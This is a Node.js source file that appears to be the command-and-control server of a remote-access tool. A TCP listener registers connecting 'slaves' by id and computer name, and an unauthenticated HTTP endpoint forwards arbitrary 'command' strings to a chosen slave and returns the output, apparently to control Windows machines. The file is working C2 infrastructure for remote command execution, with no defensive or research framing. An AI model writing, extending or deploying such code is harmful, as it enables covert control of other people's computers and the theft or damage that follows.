const net = require('net');
const express = require('express');
const http = require('http');
const app = express();

const encoding = 'utf-16le';

let slaves = [];

app.get('/', (req, res) => {
    let {id, command} = req.query;

    let slave = slaves.find(s => s.id == id);
    if (!slave) {
        res.status(404).send('No slaves with this id');
        return;
    }

    if (!slave.online) {
        res.status(400).send('Slave is offline');
        return;
    }

    slave.socket.write(wrapToBuffer(command));
    slave.socket.on('data', data => {
        res.send(data.toString(encoding));
        slave.socket.removeAllListeners('data');
    });
});

app.get('/connect', (req, res) => {
    let id = req.query.id;

    if (!id) {
        res.status(400).send('Id is required');
        return;
    }

    let slave = slaves.find(s => s.id == id);
    if (!slave) {
        res.status(404).send('Slave with this id not found');
        return;
    }

    if (!slave.online) {
        res.status(400).send('Slave is offline');
        return;
    }

    res.send(slave.computerName);
});

const server = http.createServer(app);
server.listen(3000, () => {
    console.log('connector started');
});

net.createServer(socket => {
    let address = socket.remoteAddress + ":" + socket.remotePort;

    socket.on('data', data => {
        let req = data.toString();
        let [id, computerName] = req.split(' ');

        let slave = slaves.find(s => s.id == id);

        if (!slave) {
            console.log(`new slave ${address} connected`);
            slaves.push({
                address: address,
                computerName: computerName,
                online: true,
                socket: socket,
                id: id
            });
        } else {
            console.log(`slave online ${id} ${computerName}`)
            slave.computerName = computerName;
            slave.online = true;
            slave.socket = socket;
            slave.address = address;
        }

        socket.write(wrapToBuffer('ok'));
        socket.removeAllListeners('data');
    });

    // Remove the client from the list when it leaves
    socket.on('error', () => {
        console.log(`${address} force disconnect`);
        let slave = slaves.find(s => s.address == address);
        slave.online = false;
    });

    socket.on('end', function () {
        console.log(`${address} disconnected`);
        let slave = slaves.find(s => s.address == address);
        slave.online = false;
    });
}).listen(5000);

function wrapToBuffer(str) {
    return Buffer.from(str, encoding);
}